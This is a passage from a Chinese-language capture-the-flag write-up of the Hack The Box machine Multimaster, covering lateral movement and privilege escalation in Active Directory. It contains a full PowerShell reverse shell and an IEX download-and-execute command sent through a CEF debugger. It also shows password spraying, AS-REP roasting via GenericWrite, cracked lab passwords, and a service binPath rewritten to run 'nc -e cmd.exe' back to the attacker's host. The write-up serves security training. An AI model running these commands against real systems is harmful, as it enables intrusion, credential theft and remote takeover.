+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093355745-1571258238.png" alt="image-20240729093341288"></p>
+<p>扫描本地机器并成功获得了三个 <code>CEF</code> 调试器，随便找一个通过代码来验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./cefdebug.exe --url ws://127.0.0.1:22048/43667936-2666-4f67-898b-5d4a75cd2f4a --code <span class="s2">&#34;process.version&#34;</span> 
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093416362-1657600438.png" alt="image-20240729093401071"></p>
+<p>验证成功，发现可以执行命令，接下来就可以利用这个获取一个<code>shell</code></p>
+<p>拿下面的<code>powershell</code>命令反弹<code>shell</code>，先将该命令保存为<code>shell.ps1</code>至本地</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="p">=</span> <span class="s2">&#34;10.10.14.3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$port</span> <span class="p">=</span> <span class="mf">8888</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$writer</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">StreamWriter</span><span class="p">(</span><span class="nv">$stream</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$reader</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">StreamReader</span><span class="p">(</span><span class="nv">$stream</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$buffer</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="mf">1024</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$writer</span><span class="p">.</span><span class="py">WriteLine</span><span class="p">(</span><span class="s2">&#34;Shell connected!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$writer</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">((</span><span class="nv">$input</span> <span class="p">=</span> <span class="nv">$reader</span><span class="p">.</span><span class="py">ReadLine</span><span class="p">())</span> <span class="o">-ne</span> <span class="s2">&#34;exit&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$output</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Invoke-Expression</span> <span class="nv">$input</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$writer</span><span class="p">.</span><span class="py">WriteLine</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$writer</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
+</span></span></code></pre></div><p>在<code>kali</code>开启监听，同时开启<code>http</code>服务</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvp <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></div><p>最后使用<code>cefdebug.exe</code>运行 <code>CEF</code> 调试器的服务器执行反弹 <code>shell</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">cefdebug</span><span class="p">.</span><span class="py">exe</span> <span class="p">-</span><span class="n">-url</span> <span class="n">ws</span><span class="err">:</span><span class="p">//</span><span class="mf">127.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">1</span><span class="err">:</span><span class="mf">22048</span><span class="p">/</span><span class="mf">43667936</span><span class="p">-</span><span class="mf">2666</span><span class="p">-</span><span class="n">4f67</span><span class="p">-</span><span class="n">898b</span><span class="p">-</span><span class="n">5d4a75cd2f4a</span> <span class="p">-</span><span class="n">-code</span> <span class="s2">&#34;process.mainModule.require(&#39;child_process&#39;).exec(&#39;powershell IEX(New-Object Net.WebClient).DownloadString(\&#39;http://10.10.14.3/shell.ps1\&#39;)&#39;)&#34;</span>
+</span></span></code></pre></div><p>该命令将文件下载并执行而不是将文件传到机器上并执行，这样就绕过了本地的脚本执行策略</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093447413-368288370.png" alt="image-20240729093432988"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093520842-1996459293.png" alt="image-20240729093506601"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093507850-881670073.png" alt="image-20240729093453671"></p>
+<p>这时我们就拿到了<code>cyork</code>用户的权限</p>
+<h2 id="smb传输敏感文件">
+<a class="header-anchor" href="#smb%e4%bc%a0%e8%be%93%e6%95%8f%e6%84%9f%e6%96%87%e4%bb%b6"></a>
+SMB传输敏感文件
+</h2><p>测试后发现<code>cyork</code>用户可以访问 <code>C:\inetpub\wwwroot\bin</code>目录，之前的用户访问是不行的</p>
+<p>在这里发现了一些<code>dll</code>文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729094451423-1978565072.png" alt="image-20240729094436832"></p>
+<p>这里注意到有一个名为<code>MultimasterAPI.dll</code>的<code>DLL</code></p>
+<p>尝试利用<code>SMB</code>共享将文件下载下来</p>
+<p>首先使用 <code>smbserver.py</code>建立一个共享服务器</p>
+<p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729100527970-1961370175.png" alt="image-20240729100513542"></p>
+<p>在靶机上执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">net use x: <span class="se">\\</span>10.10.14.3<span class="se">\s</span>hare
+</span></span><span class="line"><span class="cl">copy MultimasterAPI.dll x:
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729104103094-1081529091.png" alt="image-20240729104048727"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729104200842-1329366775.png" alt="image-20240729104143310"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729104217347-1563767963.png" alt="image-20240729104203181"></p>
+<p>此时发现已经将文件下载到本地了</p>
+<h2 id="逆向分析dll文件获取密码">
+<a class="header-anchor" href="#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90dll%e6%96%87%e4%bb%b6%e8%8e%b7%e5%8f%96%e5%af%86%e7%a0%81"></a>
+逆向分析dll文件获取密码
+</h2><p>分析一下是什么文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729105646125-1589069605.png" alt="image-20240729105631937"></p>
+<p>发现是<code>.NET</code>文件，用<code>dnSpy</code>工具分析</p>
+<p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729110245688-624518175.png" alt="image-20240729110231243"></p>
+<p>最后发现密码<code>D3veL0pM3nT!</code></p>
+<h2 id="三次密码喷洒登录sbauer">
+<a class="header-anchor" href="#%e4%b8%89%e6%ac%a1%e5%af%86%e7%a0%81%e5%96%b7%e6%b4%92%e7%99%bb%e5%bd%95sbauer"></a>
+三次密码喷洒登录sbauer
+</h2><p>熟悉的密码，熟悉的用户名列表，再次进行密码喷洒。这次的用户名列表和第一次的一样</p>
+<p><code>crackmapexec smb 10.10.10.179 -u users -p D3veL0pM3nT!</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729111508437-1929996575.png" alt="image-20240729111442645"></p>
+<p>再验证一下可不可以登录</p>
+<p><code>crackmapexec winrm 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729112326611-1209904571.png" alt="image-20240729112311645"></p>
+<p>可以远程登录，直接登录</p>
+<p><code>evil-winrm -i 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729112737022-1061168092.png" alt="image-20240729112710433"></p>
+<p>登录成功，但是发现没什么可以直接利用能够提权的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729135847596-1147621995.png" alt="image-20240729135821896"></p>
+<h2 id="bloodhound二次信息搜集">
+<a class="header-anchor" href="#bloodhound%e4%ba%8c%e6%ac%a1%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86"></a>
+bloodhound二次信息搜集
+</h2><p>现在我们已经拿下了三个用户，分别是<code>tushikikatomo</code>、<code>cyork</code>、<code>sbauer</code></p>
+<p>在<code>bloodhound</code>中将他们标记为已经拿下的用户，然后点击<code>Shortest Paths to High Value Targets</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729114754648-851746975.png" alt="image-20240729114739900"></p>
+<p>看着就好复杂，但是仔细看会发现很多重要的信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729114950277-1415659020.png" alt="image-20240729114935752"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730173507194-1884458758.png" alt="image-20240730173454585"></p>
+<p>仔细看会发现<code>sbauer</code>用户和<code>jorden</code>用户有<code>GenericWrite</code>关系，并且<code>jorden</code>用户属于<code>SERVER_OPERATORS</code>组（高权限组），我们可以试试能否通过滥用<code>GenericWrite</code>权限实现横向移动</p>
+<h2 id="滥用genericwrite权限横移登录jorden">
+<a class="header-anchor" href="#%e6%bb%a5%e7%94%a8genericwrite%e6%9d%83%e9%99%90%e6%a8%aa%e7%a7%bb%e7%99%bb%e5%bd%95jorden"></a>
+滥用GenericWrite权限横移登录jorden
+</h2><blockquote>
+<p>先看看之前提到的 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户破解密码哈希的技术。事实上，如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。</p>
+</blockquote>
+<p>可以使用下面这条命令来为<code>jorden</code>用户设置“不需要 <code>Kerberos</code> 预身份验证”的属性</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADUser</span> <span class="n">jorden</span> <span class="p">|</span> <span class="nb">Set-ADAccountControl</span> <span class="n">-doesnotrequirepreauth</span> <span class="vm">$true</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730173952758-9402141.png" alt="image-20240730173951299"></p>
+<p>使用<code>impactet</code>下的<code>GetNPUsers</code>脚本来获取<code>jorden</code>用户的<code>AS-REP</code>票据</p>
+<p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730174416438-495478340.png" alt="image-20240730174414913"></p>
+<p>这样就获取到了<code>AS-REP</code>票据，将上述票据保存至文件<code>hash</code>中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$krb5asrep$23$jorden@MEGACORP.LOCAL:6127c87770a9aed57005d987e2818bd2$b6a67b254f3670033f7f32d0da0a98deae8f8dbbbd71917d7e27b9ef57ff4a394af9046f1a7673137568f7572276cfaad5af44c4def95bdadeaca1dbbe31fce3c9414823286c8a8a350b7bddce823eb93d4289a49d1e8dae1654ee01cc64d744a088c9723bc5183c0a8d0128b9b394973cbdf7051400953c5e9c6250c191c020ad1bb13615a6a60f02539b169280384e47f5049f8ccc8f9c882918c7d740044118ef07d521344784d8717fb6f6223bdffd341d7334e50e184dfb3c390913381725c7bec1a212fa0a148287bebe6cac9c114974b08bc658c3acfc61ad18ade1bc1d9419790395ef5b16edc5e2145e11d0
+</span></span></code></pre></div><p>使用<code>john</code>尝试破解获取明文密码</p>
+<p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p>
+<p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730174813435-1439858535.png" alt="image-20240730174800662"></p>
+<p>得到<code>jorden</code>用户的明文密码：<code>rainforest786</code></p>
+<p>利用<code>crackmapexec</code>验证是否能够远程登录</p>
+<p><code>crackmapexec winrm 10.10.10.179 -u jorden -p 'rainforest786'</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730175140880-587706820.png" alt="image-20240730175138971"></p>
+<p>可以登录，直接利用<code>evil-winrm</code>登录</p>
+<p><code>evil-winrm -i 10.10.10.179 -u jorden -p 'rainforest786'</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730175305311-1791317928.png" alt="image-20240730175303829"></p>
+<p>登陆成功</p>
+<h1 id="ad域提权">
+<a class="header-anchor" href="#ad%e5%9f%9f%e6%8f%90%e6%9d%83"></a>
+AD域提权
+</h1><h2 id="信息搜集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86"></a>
+信息搜集
+</h2><p>先看一下该用户所拥有的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730180856080-662594263.png" alt="image-20240730180854225"></p>
+<p>之前在<code>bloodhound</code>中提到过该用户属于<code>SERVER_OPERATORS</code>组（高权限组）</p>
+<blockquote>
+<p>Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。</p>
+</blockquote>
+<p>所以可以尝试利用一下该组权限</p>
+<h2 id="滥用server-operators组权限实现权限提升">
+<a class="header-anchor" href="#%e6%bb%a5%e7%94%a8server-operators%e7%bb%84%e6%9d%83%e9%99%90%e5%ae%9e%e7%8e%b0%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+滥用Server Operators组权限实现权限提升
+</h2><ul>
+<li>利用思路</li>
+</ul>
+<blockquote>
+<p>可以找系统服务，将其执行改写，比如我让他去执行nc为我机器建立一个反向连接的shell，然后将服务重启，那么系统便会加载该服务并建立一个反向连接的shell给我的机器，该shell应该是系统级别的。</p>
+</blockquote>
+<p>首先通过<code>upload</code>将``nc64.exe传上去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730181748748-1462306931.png" alt="image-20240730181747343"></p>
+<p>经过多次测试后发现可以改变<code>browser</code>服务的路径</p>
+<p><code>sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730183323514-296023642.png" alt="image-20240730183321829"></p>
+<p>先在<code>kali</code>中设置监听</p>
+<p><code>nc -lvp 80</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730183429220-759850834.png" alt="image-20240730183427653"></p>
+<p>然后在靶机中手动重启<code>browser</code>服务</p>
+<p><code>sc.exe stop browser</code></p>
+<p><code>sc.exe start browser</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730183808518-2033487681.png" alt="image-20240730183806758"></p>
+<p>此时<code>kali</code>中收到回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730184223527-981482744.png" alt="image-20240730184218688"></p>
+<p>发现已经是<code>system</code>权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730193239799-1215521076.png" alt="image-20240730193237991"></p>
+<p>最后在<code>C:\Users\Administrator\Desktop</code>目录下找到<code>root.txt</code></p>
+<h1 id="其他提权方法">
+<a class="header-anchor" href="#%e5%85%b6%e4%bb%96%e6%8f%90%e6%9d%83%e6%96%b9%e6%b3%95"></a>
+其他提权方法
+</h1><h2 id="sebackupprivilege和serestoreprivilege权限的滥用">
+<a class="header-anchor" href="#sebackupprivilege%e5%92%8cserestoreprivilege%e6%9d%83%e9%99%90%e7%9a%84%e6%bb%a5%e7%94%a8"></a>
+SeBackupPrivilege和SeRestorePrivilege权限的滥用
+</h2><p>在对<code>jorden</code>用户信息搜集的时候，发现如下内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730193338002-1111181364.png" alt="image-20240730193320821"></p>
+<p>发现该用户具有<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>权限</p>
+<p>有了<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>这两个权限，就可以用<code>robocopy</code>来读取文件</p>
+<p><code>robocopy /b C:\users\administrator\desktop C:\Users\jorden\Documents</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730193636356-418270461.png" alt="image-20240730193634029"></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/mssql"
+        rel="tag"
+        >MSSQL</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/cve-2019-1414"
+        rel="tag"
+        >CVE-2019-1414</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/genericwrite"
+        rel="tag"
+        >GENERICWRITE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/server-operators"
+        rel="tag"
+        >SERVER OPERATORS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/sebackupprivilege"
+        rel="tag"
+        >SEBACKUPPRIVILEGE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/serestoreprivilege"
+        rel="tag"
+        >SERESTOREPRIVILEGE</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_110.webp"
+              data-sizes="auto"
+              alt="HTB Cascade"
+              class="lazyload"
+            /><a
+          href="/post/htb-cascade/"
+          aria-label="前一篇:HTB Cascade"
+          title="前一篇:HTB Cascade"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">HTB Cascade</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_93.webp"
+              data-sizes="auto"
+              alt="THM Bolt"
+              class="lazyload"
+            /><a
+          href="/post/thm-bolt/"
+          aria-label="后一篇:THM Bolt"
+          title="后一篇:THM Bolt"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">THM Bolt</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#nmap扫描">nmap扫描</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#rpc">rpc</a></li>
+        <li><a href="#ldap">ldap</a></li>
+        <li><a href="#http">http</a></li>
+      </ul>
+    </li>
+    <li><a href="#mssql注入">MSSQL注入</a>
+      <ul>
+        <li><a href="#sqlmap获取数据">sqlmap获取数据</a></li>
+        <li><a href="#hashcat破解密码">hashcat破解密码</a></li>
+        <li><a href="#密码喷洒">密码喷洒</a></li>
+      </ul>
+    </li>
+    <li><a href="#mssql-注入枚举域用户名">MSSQL 注入枚举域用户名</a>
+      <ul>
+        <li><a href="#攻击原理">攻击原理</a></li>
+        <li><a href="#获取默认域">获取默认域</a></li>
+        <li><a href="#获取域的-sid">获取域的 SID</a></li>
+        <li><a href="#枚举用户rid">枚举用户RID</a></li>
+        <li><a href="#二次密码喷洒登录tushikikatomo">二次密码喷洒登录tushikikatomo</a></li>
+      </ul>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ul>
+        <li><a href="#bloodhound信息搜集">bloodhound信息搜集</a></li>
+        <li><a href="#cve-2019-1414登录cyork">CVE-2019-1414登录cyork</a></li>
+        <li><a href="#smb传输敏感文件">SMB传输敏感文件</a></li>
+        <li><a href="#逆向分析dll文件获取密码">逆向分析dll文件获取密码</a></li>
+        <li><a href="#三次密码喷洒登录sbauer">三次密码喷洒登录sbauer</a></li>
+        <li><a href="#bloodhound二次信息搜集">bloodhound二次信息搜集</a></li>
+        <li><a href="#滥用genericwrite权限横移登录jorden">滥用GenericWrite权限横移登录jorden</a></li>
+      </ul>
+    </li>
+    <li><a href="#ad域提权">AD域提权</a>
+      <ul>
+        <li><a href="#信息搜集">信息搜集</a></li>
+        <li><a href="#滥用server-operators组权限实现权限提升">滥用Server Operators组权限实现权限提升</a></li>
+      </ul>
+    </li>
+    <li><a href="#其他提权方法">其他提权方法</a>
+      <ul>
+        <li><a href="#sebackupprivilege和serestoreprivilege权限的滥用">SeBackupPrivilege和SeRestorePrivilege权限的滥用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
